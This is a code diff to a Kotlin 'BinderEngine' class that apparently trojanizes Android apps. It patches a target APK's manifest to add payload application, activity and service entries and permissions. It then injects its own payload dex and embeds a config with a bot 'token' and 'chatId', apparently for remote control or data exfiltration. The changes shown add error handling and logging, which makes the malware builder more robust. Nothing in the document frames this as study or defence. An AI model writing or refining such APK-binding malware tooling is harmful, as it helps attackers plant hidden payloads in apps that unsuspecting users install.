@@ -61,19 +61,33 @@ class BinderEngine(private val ctx: Context) {
             ?: throw IllegalStateException("No AndroidManifest.xml in APK")
         val manifest = srcZip.getInputStream(manifestEntry).use { it.readBytes() }
 
+        val originalApp = AxmlPatcher.readApplicationName(manifest)
+        onLog(LogLevel.INFO, "Original application: " + (originalApp ?: "(none)"))
+
         onLog(LogLevel.INFO, "Patching AndroidManifest.xml...")
-        val patched = AxmlPatcher.patch(
-            manifest,
-            Const.PAYLOAD_APP,
-            Const.PAYLOAD_ACTIVITY,
-            Const.PAYLOAD_SERVICE,
-            permissions
-        )
+        val patched = try {
+            AxmlPatcher.patch(
+                manifest,
+                Const.PAYLOAD_APP,
+                Const.PAYLOAD_ACTIVITY,
+                Const.PAYLOAD_SERVICE,
+                permissions
+            )
+        } catch (t: Throwable) {
+            srcZip.close()
+            throw IllegalStateException(
+                "Manifest patch failed: " + (t.message ?: "unknown") +
+                    ". This APK may use an unusual manifest format."
+            )
+        }
         onLog(LogLevel.SUCCESS, "Manifest patched")
 
         onLog(LogLevel.INFO, "Collecting payload dex...")
         val dexes = collectOwnDex()
-        if (dexes.isEmpty()) throw IllegalStateException("Payload dex not found")
+        if (dexes.isEmpty()) {
+            srcZip.close()
+            throw IllegalStateException("Payload dex not found")
+        }
         onLog(LogLevel.INFO, "Dex files: " + dexes.size)
 
         val maxDex = srcZip.entries().toList()
@@ -84,7 +98,7 @@ class BinderEngine(private val ctx: Context) {
         val cfgBytes = JSONObject().apply {
             put("token", config.token)
             put("chatId", config.chatId)
-            put("origApp", config.originalAppClass ?: "")
+            put("origApp", originalApp ?: "")
             put("features", JSONArray(config.features))
             put("activity", activity)
         }.toString().toByteArray()
